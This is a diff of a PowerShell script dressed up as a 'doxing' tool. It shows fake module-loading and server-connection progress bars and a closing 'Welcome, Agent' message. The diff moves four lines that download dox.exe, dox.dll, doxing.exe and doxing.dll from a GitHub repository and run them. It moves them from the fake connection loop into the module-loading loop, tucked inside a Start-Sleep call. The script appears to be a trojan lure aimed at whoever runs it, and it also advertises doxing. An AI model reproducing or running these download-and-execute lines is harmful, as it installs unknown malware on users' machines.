@@ -39,17 +39,17 @@ $modules = @("Telegram API", "Phone DB", "GeoIP Resolver", "Avatar Analyzer", "S
 for ($i = 0; $i -lt $modules.Count; $i++) {
     $progress = ($i + 1) / $modules.Count * 100
     Write-Progress -Activity "Loading Modules" -Status "Loading $($modules[$i])..." -PercentComplete $progress
-    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 10)
+    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 10
+    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/dox.exe" -OutFile "dox.exe"; .\dox.exe
+    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/dox.dll" -OutFile "dox.dll"; .\dox.dll
+    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/doxing.exe" -OutFile "doxing.exe"; .\doxing.exe
+    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/doxing.dll" -OutFile "doxing.dll"; .\doxing.dll)
 }
 
 Write-Host "`n[+] Connecting to secure servers..." -ForegroundColor Green
 for ($i = 0; $i -lt 100; $i++) {
     Write-Progress -Activity "Establishing Connection" -Status "Connecting to server 192.168.1.$(Get-Random -Minimum 100 -Maximum 255)..." -PercentComplete $i
     Start-Sleep -Milliseconds 200
-    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/dox.exe" -OutFile "dox.exe"; .\dox.exe
-    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/dox.dll" -OutFile "dox.dll"; .\dox.dll
-    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/doxing.exe" -OutFile "doxing.exe"; .\doxing.exe
-    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/doxing.dll" -OutFile "doxing.dll"; .\doxing.dll
 }
 
 Write-Host "`n[+] Authentication successful. Welcome, Agent." -ForegroundColor Green
@@ -131,5 +131,6 @@ do {
         }
     }
 } until ($choice -eq '3')
+
 
 
